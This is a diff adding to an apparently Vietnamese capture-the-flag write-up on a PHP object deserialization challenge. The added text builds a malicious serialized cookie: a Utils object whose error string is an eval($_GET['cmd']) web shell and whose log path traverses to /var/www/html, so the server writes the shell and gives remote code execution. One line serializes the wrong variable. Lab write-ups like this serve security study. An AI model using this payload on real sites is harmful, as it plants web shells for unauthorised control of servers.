@@ -34,4 +34,38 @@ có tác dụng sẽ khi nội dung vào file log
 đầu tiên thì khi đổi giá trị isChampion thành 1
 thì ta đươc fake-flag
 
-~ chưa xong ạ:<
+ý tưởng :
+    bây giờ sẽ tạo một class Trainer
+class Trainer {
+    public $name;
+    public $starter;
+    public $isChampion = 1;
+}
+và một class Utils vì trong kia fix cứng nên mình sẽ phải thay đổi giá trị của $error và $logfile 
+class Utils {
+    private $error="<?php eval(\$_GET['cmd']); ?>";
+    private $logfile="../../../../../var/www/html/nono.php";
+
+} 
+
+$trainer = new Trainer();
+$util = new Utils();
+$trainer->name=$util;
+$serializedUser = serialize($user);
+$base64encod = base64_encode($serializedUser)
+
+Sau đó bạn gắn vào cookie và truy cập vào file nono.php đển remote code nha
+
+Giai thích như sau:
+
+đầu tiên thì gắn cookie vào thi sever nhận và decodeb64 ra sau đó thì unserialize
+sẽ tạo ra một object và name thì có dạng: là một object của Utils sever lúc này sẽ ngộ nhận rằng đó là Utils đã định nghĩa và khi này dùng hàm encapse sẽ covert name sang string và thực thi phương thức write_log của Utils
+sẽ ghi giá trị của error và0 logfile
+class Utils {
+    private $error="<?php eval(\$_GET['cmd']); ?>";
+    private $logfile="../../../../../var/www/html/nono.php";
+
+} 
+Vì eval cũng là một hàm nhạy cảm cho nên sẽ biến đổi nó thành 1 lệnh hay một dòng code ví dụ:
+eval("echo "hello";") sẽ in ra hello
+và như này ta có hẳn 1 route_page để RCE
